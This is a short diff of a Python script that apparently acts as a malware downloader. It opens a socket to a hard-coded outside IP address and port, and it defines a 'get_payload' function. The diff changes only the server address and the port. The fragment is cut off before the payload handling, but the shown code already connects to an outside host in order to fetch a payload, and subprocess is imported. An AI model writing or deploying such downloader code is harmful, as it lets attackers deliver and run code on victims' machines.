@@ -2,9 +2,9 @@ import socket
 import subprocess
 
 global ip,downloader_socket
-ip = "157.230.232.167"
+ip = "157.230.12.188"
 downloader_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-downloader_socket.connect((ip,2003))
+downloader_socket.connect((ip,2004))
 
 def get_payload():
     try:
